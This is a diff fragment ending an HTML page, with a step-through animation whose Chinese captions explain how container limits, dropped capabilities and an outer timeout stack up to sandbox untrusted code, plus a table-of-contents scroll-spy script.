+  { h: "容器", cap: "一条 docker run 把前几层叠起来，再加 cgroup（pids 20、内存 32 MB）、只读根、去能力：fork 炸弹炸不开，吃内存被 137 杀掉。唯独不管时间。", lit: ["n-l4"] },
+  { h: "容器 + 外面的超时", cap: "最后一个洞用外层超时补上：七件事全部拦住。每一层都只管自己那几件，所以要叠起来用。", lit: ["n-l5"] }
+];
+function stateAt(i) {
+  const step = Math.min(STEPS.length, Math.max(0, i | 0)), cur = STEPS[step - 1];
+  return { step, total: STEPS.length, lit: cur ? cur.lit : [], h: cur ? cur.h : "准备", cap: cur ? cur.cap : "点“下一步”，一层一层加上去。" };
+}
+/*SIM-END*/
+
+(() => {
+  const $ = (s, r = document) => r.querySelector(s);
+  const esc = s => String(s).replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+  const ids = [...new Set(STEPS.flatMap(s => s.lit))];
+  let cur = 0, timer = null;
+  function render(i) {
+    const st = stateAt(i); cur = st.step;
+    ids.forEach(id => { const el = document.getElementById(id); if (!el) return; const on = st.lit.includes(id); el.classList.toggle("lit", st.step > 0 && on); el.classList.toggle("fade", st.step > 0 && !on); });
+    $("#st-cap").innerHTML = '<b class="h">' + esc(st.h) + "</b>" + esc(st.cap);
+    $("#st-pos").textContent = st.step + " / " + st.total;
+    $("#st-prev").disabled = st.step === 0;
+    $("#st-next").disabled = st.step === st.total;
+  }
+  function stopAuto() { if (timer) { clearInterval(timer); timer = null; } $("#st-auto").setAttribute("aria-pressed", "false"); $("#st-auto").textContent = "自动播放"; }
+  $("#st-prev").addEventListener("click", () => { stopAuto(); render(cur - 1); });
+  $("#st-next").addEventListener("click", () => { stopAuto(); render(cur + 1); });
+  $("#st-reset").addEventListener("click", () => { stopAuto(); render(0); });
+  $("#st-auto").addEventListener("click", () => {
+    if (timer) { stopAuto(); return; }
+    if (cur === STEPS.length) render(0);
+    $("#st-auto").setAttribute("aria-pressed", "true"); $("#st-auto").textContent = "暂停";
+    timer = setInterval(() => { if (cur >= STEPS.length) stopAuto(); else render(cur + 1); }, 3600);
+  });
+  $("#stp").addEventListener("keydown", e => {
+    if (e.key === "ArrowRight") { stopAuto(); render(cur + 1); e.preventDefault(); }
+    else if (e.key === "ArrowLeft") { stopAuto(); render(cur - 1); e.preventDefault(); }
+  });
+  render(0);
+})();
+</script>
+
+<script id="tocx-js">
+(function () {
+  var bar = document.querySelector('nav.topbar .tb-in');
+  if (!bar || bar.querySelector('.tocx-steps, .tocx-dd')) return;
+  var route = document.querySelector('main nav.route');
+  var items = [], btn = null, panel = null;
+
+  function margin(t) {
+    try { if (getComputedStyle(t).scrollMarginTop === '0px') t.style.scrollMarginTop = '64px'; } catch (e) {}
+  }
+  if (route) {
+    var nav = document.createElement('nav');
+    nav.className = 'tocx-steps';
+    nav.setAttribute('aria-label', '六步跳转');
+    [].forEach.call(route.querySelectorAll('a[href^="#"]'), function (r) {
+      var id = r.getAttribute('href').slice(1), t = document.getElementById(id);
+      if (!t) return;
+      var b = r.querySelector('b'), num = b ? b.textContent.trim() : '';
+      var label = r.textContent.replace(num, '').trim();
+      var a = document.createElement('a');
+      a.href = '#' + id; a.title = (num + ' ' + label).trim();
+      a.innerHTML = '<b></b><span></span>';
+      a.firstChild.textContent = num; a.lastChild.textContent = label;
+      nav.appendChild(a); items.push({ a: a, t: t }); margin(t);
+    });
+    if (!items.length) return;
+    bar.appendChild(nav);
+    document.documentElement.classList.add('tocx-on');
+  } else {
+    var hs = document.querySelectorAll('main h2');
+    if (hs.length < 3) return;
+    var dd = document.createElement('div');
+    dd.className = 'tocx-dd';
+    dd.innerHTML = '<button type="button" class="tocx-btn" aria-expanded="false" aria-controls="tocx-panel">目录 ▾</button><div class="tocx-panel" id="tocx-panel" hidden></div>';
+    btn = dd.firstChild; panel = dd.lastChild;
+    var used = {};
+    [].forEach.call(hs, function (h, i) {
+      var t = h.closest('section[id]');
+      if (!t || used[t.id]) t = h;
+      if (!t.id) t.id = 'tocx-' + (i + 1);
+      used[t.id] = 1;
+      var c = h.cloneNode(true);
+      [].forEach.call(c.querySelectorAll('small, .sn'), function (x) { x.parentNode.removeChild(x); });
+      var a = document.createElement('a');
+      a.href = '#' + t.id;
+      a.innerHTML = '<i></i><span></span>';
+      a.firstChild.textContent = (i < 9 ? '0' : '') + (i + 1);
+      a.lastChild.textContent = c.textContent.replace(/\s+/g, ' ').trim();
+      panel.appendChild(a); items.push({ a: a, t: t }); margin(t);
+    });
+    bar.appendChild(dd);
+    function open(v) {
+      panel.hidden = !v; btn.setAttribute('aria-expanded', String(v));
+      if (v && cur >= 0) { var a = items[cur].a; panel.scrollTop = a.offsetTop - panel.clientHeight / 2; }
+    }
+    btn.addEventListener('click', function (e) { e.stopPropagation(); open(panel.hidden); });
+    panel.addEventListener('click', function (e) { if (e.target.closest('a')) open(false); });
+    document.addEventListener('click', function (e) { if (!panel.hidden && !dd.contains(e.target)) open(false); });
+    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && !panel.hidden) { open(false); btn.focus(); } });
+  }
+
+  var cur = -1, ticking = false, top = bar.parentNode;
+  function spy() {
+    ticking = false;
+    var y = top.getBoundingClientRect().bottom + 24, k = -1;
+    for (var i = 0; i < items.length; i++) {
+      if (items[i].t.getBoundingClientRect().top <= y) k = i; else break;
+    }
+    var de = document.documentElement;
+    if (k >= 0 && window.innerHeight + window.pageYOffset >= de.scrollHeight - 4) k = items.length - 1;
+    if (k === cur) return;
+    if (cur >= 0) { items[cur].a.classList.remove('on'); items[cur].a.removeAttribute('aria-current'); }
+    cur = k;
+    if (k < 0) return;
+    var a = items[k].a;
+    a.classList.add('on'); a.setAttribute('aria-current', 'true');
+    if (route) {
+      var n = a.parentNode, nr = n.getBoundingClientRect(), ar = a.getBoundingClientRect();
+      if (ar.left < nr.left) n.scrollLeft -= nr.left - ar.left + 8;
+      else if (ar.right > nr.right) n.scrollLeft += ar.right - nr.right + 8;
+    }
+  }
+  window.addEventListener('scroll', function () { if (!ticking) { ticking = true; requestAnimationFrame(spy); } }, { passive: true });
+  window.addEventListener('resize', spy);
+  spy();
+})();
+</script>
+</body>
+</html>
